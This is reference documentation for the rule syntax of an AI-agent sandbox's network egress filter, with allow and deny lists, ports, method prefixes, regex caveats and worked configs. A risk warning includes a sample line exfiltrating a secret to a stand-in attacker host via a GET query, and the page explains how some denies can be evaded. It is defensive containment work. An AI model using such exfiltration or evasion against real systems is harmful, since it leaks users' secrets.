# Rule grammar

Under a [filtering posture](modes) (`deny`, `allow`, or `ask`), the `allow` and
`deny` lists hold **rules**. A rule is a compact string classified: once, when the
config is resolved: into one of a few kinds by its syntax. A malformed rule
(including an uncompilable regex) is rejected up front with a warning naming the
list it was in, never silently mis-read at request time.

This page is the complete reference. The one law that governs everything below:

> **Deny always wins.** A request is permitted only when it matches some `allow`
> rule *and* matches no `deny` rule. A `deny` entry carves a hole out of any allow,
> including a broad `*.domain` or a [built-in self-equip](modes#the-built-in-self-equip-set)
> host.

Every rule is written the same way whether it goes in an `allow` or a `deny` list;
which list it is in decides what a match *means*. The same grammar also drives a
third list, [`mute`](observability#muting-noisy-refusals-network-mute-selinux-dontaudit), a log filter that hides a *denied* request's line without changing the verdict.

---

## The rule kinds

| Form | Example | Matches |
|---|---|---|
| **exact host** | `api.github.com` | that host only: never a subdomain or lookalike |
| **subdomain wildcard** | `*.nixos.org` | the apex `nixos.org` and any subdomain |
| **IP literal** | `1.2.3.4`, `[2001:db8::1]` | a request whose host is exactly that address |
| **exact URL** | `github.com/orgs` | that host and that exact path |
| **URL subtree** | `github.com/orgs/*` | that path and everything under it |
| **regex** | `re:^https://api\.github\.com/v3/` | the whole reconstructed URL, unanchored |
| **cleartext HTTP** | `http://legacy.example.com` | the same inspected policy, on a *plaintext* connection (port 80) |
| **raw L4 tunnel** | `tcp://ssh.example.com:22` | a byte-spliced (uninspected) stream to host:port |
| **group reference** | `@ci-hosts` | expands to a named [`[net.groups]`](groups) set |

Any of these (except `tcp://`) can carry a leading [`{VERB}` method prefix](#method-scoping)
and any host-level kind can carry a [`:port` suffix](#ports). The details follow.

---

## Exact host

A bare hostname matches **only that host**: not a subdomain of it, and not a
lookalike:

```toml
allow = ["api.github.com"]
```

`api.github.com` matches `api.github.com` and nothing else. It does **not** match
`github.com`, `sub.api.github.com`, or the classic spoof `api.github.com.evil.com`.
This spoof-safety is by construction, not by escaping: an exact host is compared as
a whole label sequence.

A bare host is an **inspected L7** rule on **port 443** (see [ports](#ports) and
[L7 vs L4](#raw-l4-splice-tcp)). Writing `https://api.github.com` means exactly the same
thing, the `https://` scheme only selects the L7 layer and the 443 default, which a
bare host already has.

## Subdomain wildcard

`*.domain` matches the apex domain **and** any subdomain:

```toml
allow = ["*.nixos.org"]   # nixos.org, cache.nixos.org, channels.nixos.org, …
```

The wildcard is bounded and suffix-spoof-safe: `*.nixos.org` matches
`evil.nixos.org` (a real subdomain) but never `nixos.org.evil.com`. There is no
unbounded `*`, a bare `*` host is **rejected** (see [no catch-all](#no-catch-all)).

A `*.domain` wildcard cannot carry a path (its host is not one concrete name); for a
path rule on a wildcard host, use a [`re:` regex](#regex).

## IP literal

A literal IP matches a request whose host is **exactly that address**: not a name
that resolves to it:

```toml
allow = ["1.2.3.4", "[2001:db8::1]"]
```

IPv4 is written bare. IPv6 is written **bracketed** when it carries a port
(`[::1]:8443`, `[2001:db8::1]:*`) and may be bare when it does not (`::1`). An IP
literal is normalized once on both sides, so every spelling of the same address
(`::1` and `0:0:0:0:0:0:0:1`) compares equal: a `deny [::1]/secret` cannot be
dodged by writing the long form.

Note the proxy resolves DNS host-side and never connects to a private or internal
address for an *unnamed* host: see the [SSRF guard](architecture#the-ssrf-guard).
An IP-literal *rule* naming an exact internal host is the deliberate exception.

## Exact URL and subtrees

A `/` in a rule makes it a `host[:port]/path` URL rule. By default it matches the
path **exactly**:

```toml
allow = ["github.com/orgs/acme"]   # /orgs/acme only, not /orgs/acme/teams
```

A trailing `/*` matches the path **and its whole subtree**, segment-aware:

```toml
allow = ["github.com/orgs/acme/*"]  # /orgs/acme and everything under it…
                                    # …but NOT /orgs/acme-corp (segment boundary)
```

The URL host must be **concrete** (an exact host or an IP): a `*.domain` with a
path is not expressible here; use `re:` for that.

### Path canonicalization

The in-cage agent controls the raw request, so a naive string match on the path
would be trivial to evade. Every request path is **canonicalized once** before any
rule sees it:

- percent-decoded (a single level: `%2f` → `/`, but a double-encoded `%252f` stays
  literal, matching a server that decodes once);
- `.`/`..` segments resolved;
- the query string dropped.

So `deny github.com/secret` also catches `/secret?x=1`, `/secret/`, `/%73ecret`, and
`/foo/../secret`: all the same resource. A *different* sub-resource
(`/secret/sub`) is a deliberate carve-in: write `/secret/*` to include the subtree.
For a query-specific or otherwise arbitrary pattern, use `re:` (which is decoded but
**not** `.`/`..`-resolved: see below).

## Regex

`re:<pattern>` matches the request's **whole reconstructed URL**, `https://<host>[:<port>]<path>` (the port shown only when it is not 443, the path
percent-decoded and including any query string):

```toml
allow = ["re:^https://api\\.github\\.com/v3/(repos|orgs)/"]
```

The engine is the [`regex` crate](https://docs.rs/regex): linear-time, with no
catastrophic backtracking (ReDoS-immune), which matters in a security filter. The
pattern is matched **unanchored**, so *you own the anchoring and escaping*: an
unanchored `api\.github\.com` would also match `evil.com/?x=api.github.com`. For
pinning a host, prefer the exact `Host`/`Subdomain` kinds, which cannot be fumbled;
reach for `re:` when you genuinely need a query- or path-shaped match a structured
rule cannot express.

Three `re:` caveats:

- Its path is decoded but **not** `.`/`..`-resolved, so a `re:` deny *can* be dodged
  by `/foo/../secret`. Anchor and structure the pattern accordingly, or use a
  structured URL rule when a dot-segment-proof deny is what you need.
- Because the reconstructed URL omits the port when it is 443, a pattern that tries
  to match `:443` explicitly (`re:…:443/…`) will never fire.
- **An empty pattern matches everything.** A bare `re:` is not "a regex that matches
  nothing" and not a typo the parser will catch: it is exactly `re:.*`, an
  [allow-everything rule](#the-catch-all-spellings). So are `re:.` and
  `re:^https://`, since the matcher only ever sees URLs of that shape. Every listing
  labels such a rule (see below), so a slip is visible rather than silent.

A `re:` rule is never scheme-split (its pattern may itself contain `://`) and is
always inspected L7. A leading `{` in a `re:` body is part of the regex (a `{n,m}`
quantifier), not a method prefix: the method prefix, if any, sits *before* `re:`.

---

## Ports

Each **host-level** kind (exact host, subdomain, IP, and the host of a URL rule)
carries a port set. A bare entry defaults to the **HTTPS port `{443}`**: least
privilege, so `allow github.com` cannot be CONNECT-tunnelled to port 22. Widen it
with a `:` suffix:

| Suffix | Admits |
|---|---|
| *(none)* | `{443}` only |
| `:80` | port 80 only |
| `:80,443,8443` | those three ports |
| `:8000-8100` | the inclusive range |
| `:80,8000-8100` | a mix of ports and ranges |
| `:*` | any port |

```toml
allow = [
  "github.com",             # 443
  "cache.example.com:80",   # 80 only
  "internal:8000-8100",     # a range
  "1.2.3.4:80,443",         # an IP on two ports
  "[::1]:8443",             # a bracketed IPv6 with a port
  "registry.example.com:*", # any port
]
```

Ports are `1..=65535` (port 0 is rejected); a range needs `lo <= hi`. A URL rule
carries the same port set on its host: `github.com:443/orgs`, `example.com:*/admin`,
`[::1]:8080/admin`.

---

## Method scoping

Any **L7** rule may carry a leading `{VERB,VERB,...}` prefix (uppercase verbs) that
scopes it to those HTTP methods only:

```toml
allow = [
  "{GET,HEAD} docs.example.com",   # reads only to this host
  "{POST} api.example.com/submit", # POST to this exact path only
  "{*} github.com",                # explicitly all verbs
]
```

- A rule with **no** prefix applies to every verb, *unless* it is an app's unscoped
  allow rule, which a per-app [`default_methods`](modes#default_methods-apps-only)
  may narrow to a read-only set at resolution.
- `{*}` means **all verbs, on purpose**: it is never rewritten by `default_methods`,
  so it is how you opt a host back out to every verb under a read-by-default app.
- `{GET,HEAD}` etc. is an explicit, fixed set (sorted and de-duplicated so equal
  specs compare and display identically).

The leading `{` is an unambiguous sentinel, no rule kind starts with one, so it
never collides with the `{n,m}` quantifiers a `re:` body may contain (those sit
after `re:`).

A method constraint bounds what an agent can drive an upstream's API to do, per that
upstream's verb semantics (`{GET,HEAD} host` permits reads, forbids writes). It is
**not** raw-exfiltration protection: a GET URL's query string still carries data
out. The real confidentiality control is the allowlist itself plus
[secret redaction](../secrets/redaction).

A `tcp://` (L4) rule carries **no** method prefix (a raw stream has no HTTP): a
prefix on one is a config error.

---

## Layers: inspected-over-TLS (default), cleartext (`http://`), raw (`tcp://`)

A rule's scheme selects the **enforcement path**. There are three:

| Scheme | Layer | Transport | Default port | Controls |
|---|---|---|---|---|
| bare / `https://` | inspected over TLS (the default) | encrypted (MITM) | 443 | full host / port / path / method / regex / redaction / anti-fronting |
| `http://` | inspected cleartext | **plaintext** | 80 | the same HTTP policy, minus credential injection: no TLS to terminate |
| `tcp://` | raw L4 splice | opaque bytes | none (required) | host:port + the SSRF guard only |

By default a rule is **inspected over TLS**: the proxy man-in-the-middles the TLS and
enforces the full host / port / path / method / regex / redaction / anti-fronting
policy. This is the right layer for HTTPS APIs, which is almost everything.

A `https://` rule covers that host whichever way the tool reaches the proxy: the usual
`CONNECT` tunnel, or the [absolute-form request some clients send
instead](architecture#requests-that-arrive-without-a-connect). Both get the same
verdict, the same guards, and a validated TLS connection to the upstream; you never
write a second rule for the second shape.

### Cleartext HTTP (`http://`)

Some tools still speak **plain HTTP** to a host that has no HTTPS endpoint. An
`http://host` rule permits exactly that: the *same* inspected HTTP policy (host,
port, path, method, the outbound-secret tripwire, the SSRF guard), but on a
plaintext connection:

```toml
[network]
mode  = "deny"
allow = [
  "http://legacy.example.com",         # plaintext, port 80
  "http://mirror.internal:8080/pkgs/*", # a path subtree, cleartext, on 8080
]
```

Key properties:

- It is **strictly opt-in**, exactly like a raw splice: only an explicit `http://`
  allow opens the clear. A bare or `https://` allow rule for the same host does
  **not**, `allow = ["legacy.example.com"]` permits HTTPS on 443, never HTTP on 80.
  The default posture (`deny`/`allow`/`ask`) never opens cleartext on its own.
- It defaults to **port 80** (override with `:port`) and keeps the full HTTP
  vocabulary, a `{VERB}` method prefix and a `/path` both work, unlike `tcp://`.
- A credential is **never** injected into a cleartext request (a bearer must not
  travel in the clear), so a `[secret]` `to` host must be inspected-over-TLS: the
  secret-target validator rejects an `http://` destination.
- Its one cost versus the default is **transport confidentiality**: the bytes are
  unencrypted on the wire. The empty-netns + allowlist boundary is unchanged: only
  the named host on its named port is reachable.

Prefer `https://` wherever the host offers it; reach for `http://` only for a host
that genuinely has no TLS.

### Raw L4 splice (`tcp://`)

A `tcp://host:port` rule is a **raw L4 splice**: the proxy copies the TCP byte
stream verbatim, without terminating TLS or inspecting it, for a non-HTTP protocol
such as SSH or a database wire protocol:

```toml
allow = [
  "tcp://ssh.example.com:22",   # a raw SSH tunnel
  "tcp://db.internal:5432",     # a database connection
  "tcp://host:*",               # every port on this host, raw
]
```

Inside the cage, a `tcp://` rule also gets **its own loopback address and a listener on each port it
names**, with `/etc/hosts` resolving the host to that address. That is what lets a non-HTTP client, which cannot speak to a `CONNECT` proxy: connect the way it always would (`psql -h db.internal -p
5432`). Only a declared destination gets one, so an undeclared port on an allowed host is a refused
connection and an undeclared host does not resolve at all; and the request that leaves still carries
the host name, so the verdict is made on what you wrote. A rule naming no single port (`:*`, a range)
and a non-loopback IP literal get no listener: reported at launch, since the rule still governs the
proxy and only the convenience is missing.

A **port below 1024** gets no listener either, for a reason that cannot be worked around: binding
one needs `CAP_NET_BIND_SERVICE` and the cage holds no capability at all. That covers ssh, and for
ssh sbx writes the way through itself. A `tcp://<host>:<port below 1024>` rule puts a `ProxyCommand`
for that host in the cage's system-wide `/etc/ssh/ssh_config`, pointing at the cage's own `CONNECT`
proxy, so the ordinary command works as written:

```bash
ssh git@github.com      # and `git push`, `git clone git@…`, `scp`, `rsync -e ssh`
```

sbx says so at launch, because the same is *not* true of a non-ssh client on such a port: it has to
ask for the `CONNECT` itself:

```
sbx: note: tcp://github.com:22 is a privileged port, which the cage cannot listen on — ssh reaches
     it through the cage's CONNECT proxy (wired in /etc/ssh/ssh_config); another client has to ask
     for that CONNECT itself
```

```bash
socat - PROXY:127.0.0.1:%h:%p,proxyport=18043      # what that ask looks like
```

The generated file is read-only and holds nothing but a `Host` block per declared destination. It is
the **system-wide** config, the last file ssh reads, so a `~/.ssh/config` of your own inside the cage
overrides it (measured, both ways). It changes nothing about what is reachable: the rule the proxy
enforces is the fence, and an undeclared host or port is refused whether or not a client finds this
file.

See [`[ssh_agent]`](../configuration/ssh-agent), which is the other half of git-over-ssh.

`tcp://localhost:<port>` is a special case worth naming, because it is the rule a developer writes
for a service on their own machine. The cage's `localhost` is its own loopback: a different machine, so the listener is placed **there**, on the port declared, and the connection it forwards goes to
the host's `localhost`. `-h localhost -p 5432` therefore reaches the service you meant; every other
port on the cage's loopback is untouched, and still belongs to whatever the cage itself runs.

The mirror image is worth naming, because it is the one place an allowed rule carries nothing: an
**inspected** rule for such a host (`http://localhost:11434`, `https://127.0.0.1:8443`, or the bare
form) is permitted by the policy and taken by no client. The cage sets
`no_proxy=localhost,127.0.0.1,::1` so an agent's own in-cage service stays intra-cage, and only a
`tcp://` rule earns a listener, so the request goes to the cage's own loopback and finds nothing
there. Both surfaces say so rather than letting you conclude your loopback is out of reach:

```
sbx: warning: `http://localhost:11434` allows a host the cage reaches through no client: localhost,
     127.0.0.1, ::1 are exempt from the cage's proxy (`no_proxy`, so the agent's own in-cage
     services stay intra-cage), and only a `tcp://` rule gets an in-cage listener — declare
     `tcp://<host>:<port>` to reach the service on YOUR loopback
```

```bash
sbx test net http://localhost:11434
# ALLOWED  http://localhost:11434
#   by allow rule: http://localhost:11434
#   note: the proxy would allow this, but nothing in the cage asks it …
```

Write the `tcp://` rule instead. The proxy itself is willing: a client forced onto it
(`curl --noproxy "" --proxy http://127.0.0.1:18043 http://localhost:11434`) reaches the host's
service and is inspected normally. Nothing routes to it by default, which is what the report says.

Key properties of a raw splice:

- It **must name a port** (`tcp://host:22`): a raw splice names the port it opens.
  `tcp://host:*` opens every port. There is no default port and no path.
- It is **strictly opt-in**: only an explicit `tcp://` allow enables a splice for
  that host:port. A host with no `tcp://` rule is always inspected.
- Its only controls are the host:port match and the [SSRF guard](architecture#the-ssrf-guard)
 : there is no path, no method, no Host/SNI anti-fronting.
- The [credential machinery is bypassed](../secrets/injection) wholesale on a
  spliced host, there is no request head to inspect, so a `[secret]` injection, the
  response redaction, and the outbound-secret tripwire are all inert for a
  `tcp://`-allowed host:port. For this reason a host must **not** be both a
  credential target and a raw-splice target (the secret-target validator rejects a
  `tcp://` destination).

Because a splice is uninspected, an L7 *path*/method deny on a host that *also*
carries a `tcp://` allow cannot apply: raw has no HTTP to match. To suppress a
splice, use a **host-level** deny: `deny evil.com:*` (or a port-agnostic
`re:^https://evil\.com`) sends the connection to the inspected path instead, where
it is refused. `udp://` is not supported; any other scheme in a rule is rejected
with a pointer.

A **deny wins across layers**: a host-level deny (`deny evil.com:80`,
`deny http://evil.com`, or a port-agnostic `deny evil.com:*`) suppresses a matching
`http://` allow, just as it suppresses a `tcp://` splice. As with a splice, a deny
scoped to the wrong port does not block a host outright: a bare `deny evil.com`
(port 443) does not stop `http://evil.com` (port 80); name the port or use `:*`.

---

## No catch-all

There is deliberately **no** `*` rule. A bare `*` in any port form (`*`, `*:*`,
`*:80`, `*/path`) is **rejected**, in an `allow` list, in a `deny` list, in a `mute`
list, and as an `sbx test net` target. Widening or narrowing a whole posture is what
[`mode`](modes) is for, and a rule that quietly did it would make the mode unreadable.

The bounded `*.domain` subdomain wildcard is unaffected (its host is `*.domain`, not
`*`).

Each list is pointed at the way out **its own author** was reaching for:

| where you wrote `*` | what you probably meant | what the error says |
|---|---|---|
| `allow` | let everything through | `mode = "shared"` (no proxy), or `mode = "allow"` to stay proxied |
| `deny` | let nothing through | `mode = "none"`, or `mode = "deny"` with the hosts you want in `allow` |
| `mute` | silence every refusal | name the noisy hosts, or write `re:.*` |
| `sbx test net *` | (nothing: a target is not a rule) | test one concrete host or URL |

### It is a guardrail, not a boundary

The check is **syntactic**: it matches the host `*`, nothing else. A regex that
matches everything is accepted, and it really does open every host:

```toml
allow = ["re:.*"]     # accepted, and equivalent in reach to the rejected `*`
```

That is not a hole being papered over, it is the line the check draws: opening or
closing everything stays an **explicit, legible act**, spelled where a reader of the
config looks for it. A `re:.*` is that act written out; `*` slipped into a long allow
list is the same reach with none of the visibility. What actually bounds a catch-all
allow rule is elsewhere and unaffected by any of this: cleartext stays opt-in, a raw
`tcp://` splice stays opt-in, and the [SSRF guard](architecture#the-ssrf-guard) still
demands a rule naming the exact host. See [opening the network
wide](modes#opening-the-network-wide) for what each spelling really buys.

### The catch-all spellings

`re:.*` is not the only one, and the others are easier to write by accident:

| rule | reach | why |
|---|---|---|
| `re:.*` | every host | the explicit catch-all |
| `re:` | every host | **an empty pattern matches every string**: a bare `re:` *is* `re:.*` |
| `re:.` | every host | one arbitrary character, which every URL has |
| `re:^https://` | every host | every URL the matcher sees starts with it |
| `{GET} re:.*` | every host, for GET | the method prefix narrows the verb, never the host |

Because the reach is in the *pattern* and not in the text you read, every surface that
shows a rule **labels it**:

```console
$ sbx net rules
  allow re:.*  (config, matches every host)

$ sbx test net https://anything.example.test
ALLOWED  https://anything.example.test
  by allow rule: re:.*
  note: that rule matches every host — this URL is not what makes it pass
```

The label is decided by asking the pattern itself, not by recognising `.*`: a rule is
tested against sentinel URLs sharing no host, port, or path, and one that admits them
all admits anything. It never changes a verdict: a catch-all rule is legitimate, it
is just the one rule whose text does not show what it does.

---

## Groups

An entry that starts with `@` is a **group reference**: it expands to the entries
of a named [`[net.groups]`](groups) set defined in the global config:

```toml
allow = ["@ci-hosts", "api.anthropic.com"]
```

A `@` only counts as a reference at the *start* of an entry: a `@` inside a URL
path (`host/@user`) or a `re:` pattern is a literal part of the rule. An **undefined**
group reference is dropped with a *loud* warning (in a `deny` list this loses a
carve-out, so it is never silent). See [Egress groups](groups).

---

## Worked examples

**An agent that talks to one provider and nothing else** (plus the always-on
self-equip set):

```toml
[network]
mode  = "deny"
allow = ["api.anthropic.com"]
```

**Read-only GitHub API access, writes forbidden, one path allowed to POST:**

```toml
[network]
mode  = "deny"
allow = [
  "{GET,HEAD} api.github.com/repos/*",
  "{POST} api.github.com/repos/acme/proj/issues",
]
```

**Broad access with a telemetry host blocked and a secret path fenced off:**

```toml
[network]
mode = "allow"
deny = [
  "telemetry.example.com",     # host-level block
  "api.example.com/admin/*",   # a path subtree, even though the host is allowed
]
```

**An allow with a narrow deny carve-out (deny wins):**

```toml
[network]
mode  = "deny"
allow = ["*.nixos.org"]        # the whole nixos.org tree…
deny  = ["evil.nixos.org"]     # …except this one subdomain
```

**Read-only to the whole internet, GET anywhere, but no writes** (weigh the risk
below before reaching for this):

```toml
[network]
mode  = "deny"
allow = ["{GET,HEAD} re:.*"]
```

Keep `mode = "deny"`: it is deny-by-default, so restricting the verbs is a matter of
opening the hosts with a single read-only rule. `re:.*` matches every URL, so it
opens every host, but only for `{GET,HEAD}`. A `POST`/`PUT`/`DELETE`, a WebSocket
(which needs an explicit [`{WS}`](#method-scoping)), and a raw [`tcp://`](#raw-l4-splice-tcp)
splice are all still refused, and the [SSRF guard](architecture#the-ssrf-guard)
still blocks private, loopback, and metadata addresses: a `re:` rule never names an
exact host, so it grants no internal-address exception.

> **The risk this does not close: read before you use it.** It bounds the *method*,
> not the *destination*. A GET carries arbitrary data in its path and query string, so
> an agent can still exfiltrate to any public host: `GET https://attacker.example/?leak=<secret>`
> is a plain GET and passes. So this posture is **not** a confidentiality boundary: it
> only forbids body uploads and mutating verbs. For an agent you do not trust (the
> [Mode-B default](../reference/glossary)), the real control is a **host
> allowlist**: name the hosts the tool legitimately needs, never `re:.*`. Reach for
> GET-anywhere only for a tool you already trust with your data and merely want to hold
> to read-only semantics: e.g. a documentation or research reader that browses widely
> but must not write.

That example is already **HTTPS-only** by construction: a `re:` rule is enforced on
the inspected-over-TLS layer, and cleartext HTTP is [strictly opt-in](#cleartext-http-http)
per host (it takes an explicit `http://` rule), so `{GET,HEAD} re:.*` never permits
plaintext. To make the intent explicit in the rule text, anchor the pattern to the
scheme, equivalent, since the [canonical URL](#regex) a `re:` rule matches always
begins `https://`:

```toml
[network]
mode  = "deny"
allow = ["{GET,HEAD} re:^https://"]   # GET/HEAD, HTTPS only, any host
```

The HTTPS-only guarantee here comes from the **layer**, not the anchor: opening
cleartext GET to a host is always a separate, deliberate `http://` rule.

**Raw SSH plus inspected HTTPS on the same host is a smell**: the L7 rule cannot
apply to the spliced port. `sbx config` warns when a host carries both an L4 allow
and an overlapping L7 rule. Test any rule set with
[`sbx test net`](observability#sbx-test-net).

---

## See also

- [Network modes](modes): where these lists live and how a mode is chosen.
- [Egress groups](groups): the `@name` references above.
- [Ask mode](ask): how an *undecided* request (matching neither list) is handled.
- [Observability](observability): `sbx test net <url>` to check a rule, and
  `sbx net rules` to see the effective, expanded set.
- [Secrets: injection](../secrets/injection) · [redaction](../secrets/redaction)
 : what rides the L7 path (and why L4 bypasses it).
- [`network` configuration reference](../configuration/network)
